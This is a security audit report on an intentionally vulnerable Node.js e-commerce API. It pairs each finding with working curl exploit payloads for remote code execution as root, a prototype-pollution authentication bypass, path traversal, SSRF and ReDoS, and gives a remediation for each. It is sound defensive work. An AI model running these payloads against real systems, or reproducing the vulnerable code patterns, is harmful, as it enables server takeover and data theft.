# Security Audit — Enterprise E-Commerce API

**Target:** `zken-cloud/vulnerable-app` @ `fa3d9b5`
**Scope:** all 24 files under `src/` (343 LOC), dependency manifest
**Method:** manual source review + runtime exploitation against a live instance (Node v22.22.2)
**Date:** 2026-08-21

## Summary

**20 findings: 6 Critical, 6 High, 5 Medium, 3 Low.**

Every Critical and High finding below was **exploited against a running instance**, not merely inferred
from source. Two independent paths give **remote code execution as root**, and a prototype-pollution
bug chains into the admin gate so that RCE is reachable **with no credentials at all**.

The application has no authentication layer. A single hardcoded bearer token (`auth.middleware.js`)
guards 4 of 13 routes; the other 9 — including profile updates, invoice generation, and file
downloads — are fully anonymous.

### Highest-impact chain (unauthenticated → root RCE)

```
POST /api/v1/user/preferences          pollute Object.prototype.authorization
        │                              (no auth required)
        ▼
requireAdmin now passes for every request, with no Authorization header
        │
        ▼
POST /api/v1/admin/calculate-discount  Function("return " + formula)()  →  uid=0(root)
```

Verified end to end. Reproduction in F-03.

### Findings

| # | Severity | Finding | Location | CWE | Verified |
|---|----------|---------|----------|-----|----------|
| F-01 | Critical | RCE via `Function` constructor | `services/admin.service.js:8` | 94 | Yes — `uid=0(root)` |
| F-02 | Critical | Command injection via `spawn` options override | `core/utils/systemUtils.js:5` | 78, 88 | Yes — `uid=0(root)` |
| F-03 | Critical | Prototype pollution → admin auth bypass | `core/utils/dataUtils.js:1` | 1321 | Yes — chained to F-01 |
| F-04 | Critical | Path traversal → arbitrary file read | `core/utils/fileUtils.js:5` | 22 | Yes — read `/etc/passwd` |
| F-05 | Critical | Mass assignment + missing authorization | `data/repositories/userRepository.js:7` | 915, 862 | Yes — self-promoted to `admin` |
| F-06 | Critical | SSRF via attacker-controlled request object | `services/catalog.service.js:10` | 918 | Yes — blocklist bypassed |
| F-07 | High | ReDoS (exponential backtracking) | `middlewares/validation.middleware.js:4` | 1333 | Yes — >110s stall |
| F-08 | High | Regex injection | `middlewares/validation.middleware.js:5` | 624 | Yes — validation bypassed |
| F-09 | High | Predictable password-reset token | `core/utils/cryptoUtils.js:1` | 338, 330 | Yes |
| F-10 | High | Hardcoded credentials in source | `auth.middleware.js:4`, `order.controller.js:33` | 798 | Yes |
| F-11 | High | TOCTOU race → inventory oversell | `services/checkout.service.js:5` | 362 | Yes — stock reached `-7` |
| F-12 | High | Memory exhaustion via cache retention | `core/cache/mediaCache.js:8` | 401 | Yes — 640 B pinned 195 MB |
| F-13 | Medium | Unbounded `allocUnsafe` → DoS + uninit memory | `core/utils/systemUtils.js:13` | 789, 908 | Partial |
| F-14 | Medium | Filter logic flaw exposes internal records | `data/repositories/productRepository.js:11` | 863 | Yes |
| F-15 | Medium | Promo codes infinitely stackable | `services/discount.service.js:12` | 841 | Yes — $100 → $10.74 |
| F-16 | Medium | Non-constant-time secret comparison | `core/utils/cryptoUtils.js:7` | 208 | Code defect only |
| F-17 | Medium | Predictable temp file path | `controllers/product.controller.js:18` | 377 | Not attempted |
| F-18 | Low | 1 MB allocation per request | `middlewares/tracking.middleware.js:10` | 770 | Yes |
| F-19 | Low | No rate limiting / security headers | `app.js` | 693, 770 | By inspection |
| F-20 | Low | `existsSync` → `sendFile` TOCTOU | `controllers/order.controller.js:27` | 367 | Not attempted |

Dependencies (`express@4.22.2`, `body-parser@1.20.6`) reported **0 known vulnerabilities**. Every
issue here is in first-party code.

---

## Critical

### F-01 — Remote code execution via `Function` constructor
`src/services/admin.service.js:7-11` · CWE-94

```js
exports.evaluateDiscount = (formula) => {
    const generator = [].sort.constructor;   // === Function
    const runtimeFunc = generator(`return ${formula}`);
    return runtimeFunc();
};
```

`[].sort.constructor` is an obfuscated reference to `Function`. The request body string
`req.body.formula` is concatenated directly into a function body and invoked. This is `eval` by
another name, and the indirection appears designed to evade grep-based scanning for `eval(`.

`require` is not in scope inside a `Function` body, but `process` is a global, so
`process.mainModule.require` reaches the full module system:

```bash
curl -X POST localhost:3000/api/v1/admin/calculate-discount \
  -H 'Content-Type: application/json' -H 'Authorization: Bearer admin-secret-token' \
  -d '{"formula":"process.mainModule.require(\"child_process\").execSync(\"id\").toString()"}'
```
```json
{"price":"uid=0(root) gid=0(root) groups=0(root)\n"}
```

Environment variables exfiltrate just as easily via `Object.keys(process.env)`.

**Fix:** delete the endpoint. If dynamic pricing rules are a genuine requirement, use a sandboxed
expression evaluator with an explicit operator allowlist (e.g. `expr-eval`) — never `Function`,
`eval`, or `vm` (which is not a security boundary).

---

### F-02 — Command injection via `spawn` options override
`src/core/utils/systemUtils.js:3-11` · CWE-78, CWE-88

```js
exports.executeNetworkDiagnostic = (ip, additionalOpts, callback) => {
    const defaultOpts = { timeout: 5000, shell: false };
    const opts = Object.assign({}, defaultOpts, additionalOpts);   // caller overrides shell
    const child = spawn('ping', ['-c', '1', ip || '8.8.8.8'], opts);
```

The argument-array form of `spawn` is safe *only while `shell` stays false*. `additionalOpts` comes
straight from `req.body.options` and is merged **after** the defaults, so the attacker simply turns
the shell back on and the `ip` argument becomes shell syntax:

```bash
curl -X POST localhost:3000/api/v1/admin/shipping-check \
  -H 'Content-Type: application/json' -H 'Authorization: Bearer admin-secret-token' \
  -d '{"providerIP":"127.0.0.1; id; uname -a","options":{"shell":true}}'
```
```json
{"logs":"uid=0(root) gid=0(root) groups=0(root)\nLinux vm 6.18.5-fc-v20 ... x86_64 GNU/Linux\n"}
```

`env` and `cwd` are equally overridable — `env` alone permits `LD_PRELOAD` injection.

**Fix:** never merge caller-supplied objects into process-spawn options. Reverse the merge order so
defaults win (`Object.assign({}, additionalOpts, defaultOpts)`) and, better, pick only known-safe
keys. Validate `ip` against a strict IP/hostname pattern before use.

---

### F-03 — Prototype pollution → authentication bypass
`src/core/utils/dataUtils.js:1-11`, reached via `POST /api/v1/user/preferences` (unauthenticated) · CWE-1321

```js
exports.applySettingsMerge = function applySettingsMerge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
            target[key] = target[key] || {};
            applySettingsMerge(target[key], source[key]);   // recurses into __proto__
```

A recursive merge with no guard on `__proto__`, `constructor`, or `prototype`. `JSON.parse` creates
`__proto__` as an *own enumerable* property, so `for...in` walks it; `target["__proto__"]` then
resolves to `Object.prototype` and the recursive call writes attacker keys onto it.

Pollution leaks into every object in the process:

```bash
curl -X POST localhost:3000/api/v1/user/preferences -H 'Content-Type: application/json' \
  -d '{"preferences":{"__proto__":{"POLLUTED":"yes"}}}'
curl -X POST localhost:3000/api/v1/user/preferences -H 'Content-Type: application/json' -d '{"preferences":{}}'
# {"theme":"light","POLLUTED":"yes"}   <-- a *different* request's object
```

**Escalation.** Node builds `req.headers` as an ordinary object, so it inherits from the polluted
prototype. `auth.middleware.js` reads `req.headers['authorization']` — which the attacker can now
supply globally, without ever sending the header:

```bash
# 1. no credentials -> rejected
curl -X POST localhost:3000/api/v1/admin/calculate-discount \
     -H 'Content-Type: application/json' -d '{"formula":"1+1"}'
#    Admin access required.

# 2. pollute the prototype (no auth needed)
curl -X POST localhost:3000/api/v1/user/preferences -H 'Content-Type: application/json' \
  -d '{"preferences":{"__proto__":{"authorization":"Bearer admin-secret-token"}}}'

# 3. same unauthenticated request now executes code as root
curl -X POST localhost:3000/api/v1/admin/calculate-discount \
     -H 'Content-Type: application/json' \
     -d '{"formula":"process.mainModule.require(\"child_process\").execSync(\"id\").toString()"}'
#    {"price":"uid=0(root) gid=0(root) groups=0(root)\n"}
```

This converts F-01 and F-02 from authenticated-admin issues into **pre-auth remote root**. It also
makes the pollution a whole-process denial of service (polluting `then`, `toString`, or `length`
breaks unrelated code paths).

**Fix:** reject `__proto__` / `constructor` / `prototype` keys in the merge loop, iterate with
`Object.keys()` over `Object.hasOwn` entries, and build merge targets with `Object.create(null)`.
Run the server with `--disable-proto=throw`. Independently, the admin check must not trust a value
that can arrive via prototype — read headers with `Object.hasOwn(req.headers, 'authorization')`.

---

### F-04 — Path traversal → unauthenticated arbitrary file read
`src/core/utils/fileUtils.js:4-12`, route `GET /api/v1/downloads` (no auth) · CWE-22

```js
const sanitized = filename.replace(/\.\.\//g, '');
const finalDir = path.join(__dirname, '../../../../downloads', sanitized);
```

The blocklist runs **once, non-recursively**, so a payload that contains `../` *after* one pass of
removal survives. `....//` → strip the inner `../` → `../`:

| input | resulting path |
|---|---|
| `../../../../etc/passwd` | `/home/user/downloads/etc/passwd` (blocked) |
| `....//....//....//....//etc/passwd` | **`/etc/passwd`** |
| `..././..././etc/passwd` | `/home/etc/passwd` |

```bash
curl "localhost:3000/api/v1/downloads?file=....//....//....//....//....//etc/passwd"
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...
```

Any file readable by the (root) process is exposed — `.env`, SSH keys, application source,
`/proc/self/environ`.

**Fix:** stop sanitizing by substring removal. Resolve and then verify containment:

```js
const root = path.resolve(__dirname, '../../../../downloads');
const target = path.resolve(root, filename);
if (target !== root && !target.startsWith(root + path.sep)) throw new Error('Invalid path');
```

Better still, never accept a path from the client — map an opaque ID to a server-side filename.

---

### F-05 — Mass assignment and missing authorization
`src/data/repositories/userRepository.js:3-11`, route `PUT /api/v1/user/profile/:id` · CWE-915, CWE-862

```js
Object.keys(payload).forEach(key => {
    if (key !== 'id') user[key] = payload[key];    // only `id` is protected
});
```

Every field except `id` is writable from the request body — including `role` and `balance`. The
route carries **no authentication middleware at all**, so any anonymous caller can rewrite any user
by ID:

```bash
curl -X PUT localhost:3000/api/v1/user/profile/1001 -H 'Content-Type: application/json' \
  -d '{"role":"admin","balance":999999999,"name":"Attacker"}'
# {"id":"1001","name":"Attacker","role":"admin","balance":999999999}
```

Two distinct bugs: privilege escalation via mass assignment, and a missing ownership check (IDOR) —
`:id` is never compared against the authenticated caller.

**Fix:** allowlist assignable fields (`const { name, email } = payload`). Require authentication and
assert the session subject owns `:id`; `role` and `balance` must only be mutable through separate,
privileged, audited paths.

---

### F-06 — Server-side request forgery
`src/services/catalog.service.js:6-15` · CWE-918

```js
if (target && String(target.url).includes('internal-network')) {
    return cb(new Error("Forbidden access rule triggered."));
}
http.get(target, ...)   // `target` is the raw request body object
```

The guard inspects one string property (`target.url`) for one hardcoded substring, but `target` is
passed to `http.get` as a full **options object**. Supplying `host`/`port`/`path` instead of `url`
skips the check entirely:

```bash
# blocked
-d '{"target":{"url":"http://internal-network/x"}}'          -> Forbidden access rule triggered.

# bypassed — reaches an internal listener
-d '{"target":{"host":"127.0.0.1","port":9999,"path":"/latest/meta-data/"}}'
# INTERNAL_SECRET{iam-credentials-AKIA-EXAMPLE}
```

The attacker also controls `headers` (verified), and `socketPath` would reach Unix sockets such as
`/var/run/docker.sock` — a container-escape primitive. Cloud metadata (`169.254.169.254`) is
directly reachable. The 50-character response truncation limits but does not prevent exfiltration.

**Fix:** accept a URL *string* only, parse it with `new URL()`, enforce an allowlist of schemes
(`https`) and destination hosts, and resolve the hostname and reject private/link-local/loopback
ranges before connecting (re-checking on redirect to close the DNS-rebinding gap).

---

## High

### F-07 / F-08 — ReDoS and regex injection
`src/api/middlewares/validation.middleware.js:4-6` · CWE-1333, CWE-624

```js
const baseRule = '^([a-zA-Z0-9_]+\\s?-?)+';        // nested quantifier
const dynamicSuffix = corporateDomain || 'example\\.com';
const regex = new RegExp(baseRule + dynamicSuffix + '$');   // attacker-supplied pattern
```

**F-07 (ReDoS).** `([a-zA-Z0-9_]+\s?-?)+` is the textbook catastrophic-backtracking construct — a
quantified group whose body is itself quantified. Measured against `POST /user/register` with
`"a"*N + "!"`:

| input length | response time |
|---|---|
| 30 | 0.06 s |
| 34 | 0.60 s |
| 38 | 9.50 s |
| 42 | **>110 s (timed out)** |

Clean doubling per 2 characters. Node is single-threaded: one ~40-byte unauthenticated request
freezes the **entire server** for minutes, and a handful takes it down permanently. This is the
cheapest full-availability attack in the codebase.

**F-08 (regex injection).** `corporateDomain` is interpolated into the pattern unescaped, so the
caller supplies the validation rule and trivially defeats it:

```bash
curl -X POST localhost:3000/api/v1/user/register -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","corporateDomain":".*"}'
# {"success":true,"message":"Valid email registered"}
```

It also hands the attacker a *guaranteed* ReDoS (`(a+)+$`) and lets `$` anchoring be neutralised.

**Fix:** never build a regex from user input. Validate the address with a non-backtracking parser,
then compare the domain by exact string equality against a configured allowlist. If a pattern must
be dynamic, escape the interpolated segment and run matching under a timeout (`RegExp` in a worker,
or the `re2` engine, which is immune to backtracking).

---

### F-09 — Predictable password-reset token
`src/core/utils/cryptoUtils.js:1-5` · CWE-338, CWE-330

```js
const p1 = Date.now().toString(36);
const p2 = Math.random().toString(36).substring(2);
return `${p1}-${p2}`;
```

Returned directly by `POST /user/forgot-password` as the reset token. Neither component is
cryptographically secure:

```
mt27c3qu-ufzl7rcykbc
mt27c3ri-zs7ceqzm9r     <-- prefix is just the millisecond clock
mt27c3s4-9bolk0rtb2n
```

`Date.now()` is public knowledge (and leaks in the `Date` response header), reducing that half to a
small brute-force window. `Math.random()` is V8's xorshift128+ — non-cryptographic, and its internal
state is recoverable from a handful of observed outputs, after which **all past and future tokens**
are computable. An attacker who requests one reset for their own account can derive the victim's.

**Fix:** `crypto.randomBytes(32).toString('hex')`. Store only a hash of the token, bind it to the
user, expire it in minutes, and invalidate on use.

---

### F-10 — Hardcoded credentials in source
`src/api/middlewares/auth.middleware.js:4`, `src/api/controllers/order.controller.js:33` · CWE-798

```js
if (token === 'Bearer admin-secret-token') return next();          // auth.middleware.js
const expected = "whsec_super-secret-system-token-xyz";            // order.controller.js
```

Both live in a public git history — the admin token is the *only* thing protecting the two RCE
endpoints, and the webhook secret makes the signature check ornamental. Rotation requires a code
change and redeploy. This also renders F-16 moot: no timing attack is needed to learn a secret that
is committed to the repository.

**Fix:** load both from environment/secret manager, rotate the exposed values (assume compromised),
and purge them from git history. Replace the equality check with a real signed-token scheme (JWT or
HMAC) verified with `crypto.timingSafeEqual`.

---

### F-11 — TOCTOU race condition in checkout
`src/services/checkout.service.js:5-14` · CWE-362

```js
if (inventory[item] >= quantity) {                        // CHECK
    await new Promise(resolve => setTimeout(resolve, 100));   // yields the event loop
    inventory[item] -= quantity;                          // USE
```

The `await` between check and decrement lets every concurrent request pass the check against the
same pre-decrement value. Starting from `laptop: 5`, with 20 concurrent single-unit orders:

```
Purchased 1. Stock left: 4 ... 1, 0, -1, -2, -3, -4, -5, -6, -7
```

**12 units sold from 5 in stock**, and inventory is left negative — permanently corrupting the
`!inventory[item]` guard's behaviour around zero. Direct financial loss; the same pattern would
apply to balance deduction.

**Fix:** make check-and-decrement atomic. In a real datastore use a conditional update
(`UPDATE ... SET stock = stock - ? WHERE id = ? AND stock >= ?`) and treat zero affected rows as
out-of-stock. In-process, serialise per-item with a mutex/queue. Never yield between a guard and the
write it protects.

---

### F-12 — Memory exhaustion via retained buffer slices
`src/core/cache/mediaCache.js:5-12` · CWE-401, CWE-770

```js
const fileBuffer = fs.readFileSync(filePath);   // 5 MB
const headerSlice = fileBuffer.subarray(0, 16); // shares the parent's memory
globalHeaderCache[fileId] = headerSlice;        // unbounded, attacker-keyed
```

Two compounding defects. `Buffer.subarray` returns a **view** over the parent `ArrayBuffer`, not a
copy, so retaining 16 bytes pins the whole 5 MB allocation. And `globalHeaderCache` has no size
limit or eviction, keyed by the caller's `fileId`.

```
external before        : 6.2 MB
external after 40 calls: 201.4 MB
cached payload is only 40 x 16 bytes = 640 bytes
```

640 bytes of intended cache retained **195 MB** of process memory — a ~300,000× amplification.
Each request also writes and reads a 5 MB temp file synchronously, blocking the event loop.

**Fix:** copy the slice (`Buffer.from(fileBuffer.subarray(0, 16))`), bound the cache with an LRU and
a fixed entry cap, and read only the needed bytes with a streamed/positional read instead of loading
the whole file.

---

## Medium

### F-13 — Unbounded `allocUnsafe` with attacker-controlled size
`src/core/utils/systemUtils.js:13-16`, route `GET /api/v1/order/invoice` (no auth) · CWE-789, CWE-908

```js
const m = 'al' + 'locUnsa' + 'fe';    // string-split to evade static analysis
return Buffer[m](size);               // size = req.query.layoutSize
```

The contents are base64-encoded and returned to the caller. Two concerns:

*Denial of service (confirmed).* `layoutSize` is only checked for `isNaN` and `<= 0`, with no upper
bound. `?layoutSize=2000000000` blocked the server for **22 seconds** before returning 500.

*Uninitialized memory disclosure (unconfirmed).* `allocUnsafe` skips zero-filling, so the buffer may
contain previously freed heap data. **I could not demonstrate recovery of secrets on Node v22** —
allocations returned zeroed pages across sizes from 64 B to 1 MB, and a targeted pool-reuse harness
found no residue in 200 rounds. I am reporting it as a real defect rather than a proven exploit: the
deliberate obfuscation of the method name signals intent, the guarantee is absent by design, and
allocator behaviour is not a security control — it varies by version, size class, and platform.

**Fix:** use `Buffer.alloc` (zero-filled) and enforce a hard maximum on `size`. Returning raw memory
to a client has no legitimate purpose here; the endpoint should be removed.

---

### F-14 — Filter logic flaw exposes internal records
`src/data/repositories/productRepository.js:7-16` · CWE-863

```js
if (query[k]['$ne'] !== undefined && doc[k] !== query[k]['$ne']) return true;   // returns from the callback
```

The `$ne`/`$in` branches `return true` — accepting the document immediately and **skipping every
remaining key** in the query, rather than continuing the loop. Any Mongo-style operator therefore
turns the filter into "match everything", exposing the `internal` catalog entry that ordinary
queries never surface:

```bash
curl -X POST localhost:3000/api/v1/products/search -H 'Content-Type: application/json' \
  -d '{"query":{"type":{"$ne":"zzz"}}}'
# [...,{"id":"3","type":"internal","name":"Internal Config","price":0}]
```

Accepting client-supplied query objects wholesale is also the shape that becomes true NoSQL
injection the moment this in-memory store is swapped for MongoDB.

**Fix:** set a `matched = false` flag and evaluate all keys before deciding; never return early on a
positive. Accept a fixed set of scalar search parameters instead of a query object, and filter
`internal` records out at the repository boundary.

---

### F-15 — Promo codes are infinitely stackable
`src/services/discount.service.js:8-21` · CWE-841

`appliedPromos` is appended to but never consulted, so the same code re-applies without limit:

```bash
# 10x SUMMER20 against a $100 cart
{"totalPrice":10.737418240000006,"appliedPromos":["SUMMER20","SUMMER20", ...]}
```

$100 → $10.74, and the multiplier converges toward zero with more requests. Unauthenticated, and
`cartId` is unvalidated against any session (a second IDOR — any caller can mutate any cart).

**Fix:** check `cart.appliedPromos.includes(promoCode)` and reject duplicates; enforce a maximum
discount floor; recompute totals from line items rather than mutating a running total; bind carts to
sessions. Note the float arithmetic — money should be integer minor units.

---

### F-16 — Non-constant-time secret comparison
`src/core/utils/cryptoUtils.js:7-13` · CWE-208

```js
exports.verifyTimingSafeSignature = (token, expected) => {
    if (token.length !== expected.length) return false;   // length oracle
    for (let i = 0; i < expected.length; i++) {
        if (expected[i] !== token[i]) return false;       // first-difference oracle
```

The name asserts a property the implementation does not have: it returns early on length mismatch
and again at the first differing byte, so runtime correlates with the length of the correct prefix.

**Practical exploitability is low, and I want to be precise about what I measured.** My byte-recovery
harness failed to recover the secret, and in-process microbenchmarks were dominated by JIT artifacts
(a 30-byte-matching prefix measured *faster* than a first-byte mismatch — physically meaningless).
The per-comparison difference is single-digit nanoseconds over a 34-byte secret, far below network
jitter. Rated Medium as a definite code defect, not a demonstrated attack — and largely academic
anyway, since F-10 publishes the secret in source.

**Fix:** `crypto.timingSafeEqual(Buffer.from(token), Buffer.from(expected))`, guarded by a prior
length check on hashed values so the length itself carries no secret. For webhooks, use the
provider's official verification helper.

---

### F-17 — Predictable temp file path
`src/api/controllers/product.controller.js:18-26` · CWE-377

```js
const dummyPath = '/tmp/fake_large_media_' + Date.now() + '.pdf';
fs.writeFileSync(dummyPath, Buffer.alloc(5 * 1024 * 1024, 'A'));
```

A world-writable directory plus a fully predictable name. A local attacker who pre-creates that path
as a symlink causes the (root) process to overwrite the link target with 5 MB of `A`s — arbitrary
file clobbering. Not attempted, as it requires local access. `unlinkSync` is also unguarded, so any
throw between write and cleanup leaks a 5 MB file permanently.

**Fix:** `fs.mkdtempSync(path.join(os.tmpdir(), 'media-'))` with `O_EXCL`, cleanup in `finally`. This
endpoint fabricates a dummy file for no clear reason — it should probably not exist.

---

## Low

- **F-18** — `tracking.middleware.js:10` builds a ~1 MB string (`new Array(1000000).join('*')`) on
  **every request**, synchronously, and stores it in module state. Pure GC pressure and latency for
  a feature whose own log line admits it is "Never actually called". Delete it. (CWE-770)
- **F-19** — `app.js` wires no rate limiting, no `helmet`, no CORS policy, no request size limit, and
  no logging. Given F-07 and F-13, rate limiting is the cheapest mitigation available. (CWE-693)
- **F-20** — `order.controller.js:27` checks `fs.existsSync(p)` then calls `res.sendFile(p)` — a
  TOCTOU window, and `sendFile` should be given a `root` option to enforce containment. (CWE-367)

---

## Recommended remediation order

1. **Remove both RCE sinks** (F-01, F-02) — the only findings that yield code execution.
2. **Fix the prototype-pollution merge** (F-03) — it defeats authentication process-wide and is the
   hinge that makes F-01/F-02 pre-auth.
3. **Fix path containment and add authentication** (F-04, F-05) — unauthenticated file read and
   privilege escalation.
4. **Rotate and externalise the hardcoded secrets** (F-10); treat both as compromised.
5. **Replace the regex validator and the token generator** (F-07, F-08, F-09).
6. **Introduce a real authentication and authorization layer.** Every finding above is amplified by
   its absence: 9 of 13 routes are anonymous, and ownership is never checked on `:id` or `cartId`.
7. Then the availability and business-logic items (F-06, F-11, F-12, F-13, F-14, F-15).

Beyond individual patches, three patterns recur and are worth addressing as engineering practice:

- **Blocklists used where allowlists are required** — F-04 (strip `../`), F-06 (substring match),
  F-05 (block only `id`). Each was bypassed on the first attempt. Enumerate what is permitted.
- **Names that assert safety the code does not provide** — `getSafeDownloadPath`,
  `verifyTimingSafeSignature`, `defaultOpts.shell = false`. These read as mitigations during review
  while providing none.
- **Deliberate evasion of static analysis** — `'al'+'locUnsa'+'fe'` and `[].sort.constructor` exist
  only to avoid matching a scanner. Grep-based CI would pass this repository; add semantic linting
  (`eslint-plugin-security`, CodeQL) and treat obfuscated sink access as a review blocker.

## Verification notes

Findings were exploited against a live instance on Node v22.22.2. Test processes were terminated and
no repository files were modified; `package-lock.json` was generated by `npm install` during setup.
Marked-unverified items (F-17, F-20) require local filesystem access; F-13's disclosure half is
explicitly unconfirmed and documented as such above. Dependency audit: 0 known vulnerabilities.
